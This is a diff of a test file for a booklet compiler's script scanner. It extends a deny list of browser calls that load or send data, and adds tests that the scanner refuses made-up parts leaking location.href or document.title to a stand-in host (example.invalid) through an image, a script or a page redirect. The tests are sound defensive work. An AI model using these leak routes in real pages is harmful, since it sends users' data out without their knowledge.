@@ -42,7 +42,10 @@ const SAMPLES=["localStorage.clear();","sessionStorage.clear();","indexedDB.open
   "eval('1');","[].constructor('1');","var f=Function;","import/**/('./x.js');","importScripts('x');","setTimeout('x',1);","setInterval('x',1);",
   "el.innerHTML='x';","el.outerHTML='x';","el.insertAdjacentHTML('beforeend','x');","document.write('x');","new DOMParser();",
   "r.createContextualFragment('x');","f.srcdoc='x';","window['x'];","globalThis.x;","self['x'];","top['x'];","parent['x'];","document['x'];",
-  "navigator['x'];","this['x'];","Reflect.get(a,'b');","var w=window;","var s=self;"];
+  "navigator['x'];","this['x'];","Reflect.get(a,'b');","var w=window;","var s=self;",
+  /* routes that send without a call of the names above: an element made to load, an address given to one, leaving the page, a ping */
+  "d.createElementNS(n,'a');","d.createElement('iframe');","el.src='x';","el.setAttribute('src','x');","window.open('x');","location.assign('x');",
+  "location.search='?q';","var ping=1;","f.requestSubmit();","new Audio('x');","new WebTransport('x');","new RTCPeerConnection();","fetchLater('x');"];
 {const alts=[];
   SC.BANNED.forEach(([why,re],ei)=>{let depth=0,cur="";const parts=[];
     for(let i=0;i<re.source.length;i++){const c=re.source[i];
@@ -72,8 +75,15 @@ refuse("bad-word",{"10-a.js":part("var x=1;\nvar y=window.localStorage;")},/10-a
 refuse("bad-shape",{"10-a.js":"var leak=1;\n(function(){})();"},/10-a\.js: it does not open with an immediately called function/);
 refuse("bad-syntax",{"10-a.js":"(function(){ var = ; })();"},/10-a\.js: it is not valid script/);
 refuse("one-of-two",{"10-a.js":part("var a=1;"),"20-b.js":part("fetch('/x');")},/20-b\.js line 3: send something \(fetch\)/);
+/* the routes to the network that need no banned call: each is refused in a made-up part, naming the rule, and a part that only reads the address is let through */
+refuse("loads-an-image",{"10-a.js":part("var i=document.createElement(\"img\");i.src=\"https://example.invalid/x?\"+location.href;document.body.appendChild(i);")},/10-a\.js line 3: send something \(an element that loads, made at run time\)/);
+refuse("loads-a-script",{"10-a.js":part("var s=document.createElement(\"script\");s.setAttribute(\"src\",\"https://example.invalid/a.js\");document.head.appendChild(s);")},/10-a\.js line 3: send something \(an element that loads/);
+refuse("opens-a-window",{"10-a.js":part("window.open(\"https://example.invalid/\");")},/10-a\.js line 3: send something \(leaving the page/);
+refuse("changes-location",{"10-a.js":part("location.assign(\"https://example.invalid/\"+document.title);")},/10-a\.js line 3: send something \(leaving the page/);
+chk("a part that only reads the page's address, or compares an address, is let through",SC.scan("var u=location.href.split('#')[0];if(a.src===b){}if(location.hash==='#x'){}el.open=true;").length===0);
 
 /* ---- the compiler: link, write, stamp, refuse ---- */
+const PLAIN1='---\nbooklet: "0.16"\nid: t/gradedone\ntitle: Graded one\nlang: en\n---\n\n# Graded one\n\nA made-up page with one graded question.\n\n> [!choice|pick] Pick the right one\n- [x] Right\n- [ ] Wrong\n';
 const X=E.load(),book=path.join(ROOT,"examples","how-tides-work.booklet.md");
 const good=mk("good",{"10-a.js":part("var a=1;")});
 const withScript=C.compile([{file:book}],{form:"both",engine:X,scriptDir:good,forceScript:true});
@@ -85,7 +95,15 @@ chk("a site fragment never carries the link (the layout does)",!/<script/.test(s
 chk("booklet.js is written beside booklet.css in each form, stamped",["standalone/","site/"].every(r=>{const t=withScript.assets.get(r+"booklet/booklet.js");return typeof t==="string"&&/^\/\* booklet compile \S+ · booklet\.js · sha256:[0-9a-f]{64} \*\/\n/.test(t)&&t.includes("var a=1;");}));
 chk("the run says how big the script is, and what it is made of",withScript.script&&withScript.script.parts[0]==="10-a.js"&&withScript.script.bytes>0);
 const rep=C.reportText(withScript);
-chk("the report says the page links a script that keeps nothing",/Script: the page links booklet\.js, which keeps nothing and sends nothing/.test(rep));
+chk("the report says the pages link a script that keeps nothing (all three pages of a booklet that forces it)",/Script: booklet\.js, which keeps nothing and sends nothing, is linked by all 3 pages\./.test(rep));
+{const one=C.compile([{text:PLAIN1,name:"gradedone",dir:tmp}],{form:"standalone",engine:X,scriptDir:good}),mix=path.join(ROOT,"test","fixtures","compile-pages.booklet.md");
+  chk("a booklet of one page: the report says the page links the script that keeps nothing",one.results[0].rep.script&&/Script: the page links booklet\.js, which keeps nothing and sends nothing/.test(C.reportText(one)));
+  for(const form of ["standalone","site","both"]){const r=C.compile([{file:mix}],{form,engine:X,scriptDir:good}),t=C.reportText(r).split("\n").filter(l=>/^  Script/.test(l)).join("\n"),pl=r.results[0].rep.pageList,need=pl.filter(p=>p.needs).map(p=>p.path);
+    chk("("+form+") a booklet of several pages: the report names the pages that need the script ("+need.length+" of "+pl.length+") and not the others",need.length>0&&need.length<pl.length
+      &&need.every(p=>t.includes(p))&&pl.filter(p=>!p.needs).every(p=>!t.includes(p.path)),t);}
+  const tb=C.reportText(C.compile([{file:mix}],{form:"both",engine:X,scriptDir:good}));
+  chk("(both) the site half gets the layout line as well as the standalone half's note",/Script: booklet\.js, which keeps nothing and sends nothing, is linked by 3 of 5 pages/.test(tb)&&/Script \(site form\): [^\n]*add <script src="\/booklet\/booklet\.js" defer><\/script> to the layout/.test(tb));
+  chk("(standalone) no layout line: nothing is asked of a layout",!/to the layout/.test(C.reportText(C.compile([{file:mix}],{form:"standalone",engine:X,scriptDir:good}))));}
 const siteOnly=C.compile([{file:book}],{form:"site",engine:X,scriptDir:good,forceScript:true});
 chk("a site-only run still writes the script, and the report tells the layout to load it",siteOnly.assets.has("booklet/booklet.js")&&/add <script src="\/booklet\/booklet\.js" defer><\/script> to the layout/.test(C.reportText(siteOnly)));
 const PLAIN='---\nbooklet: "0.16"\nid: t/plain\ntitle: Plain\nlang: en\n---\n\n# Plain\n\nA made-up page with no question.\n';
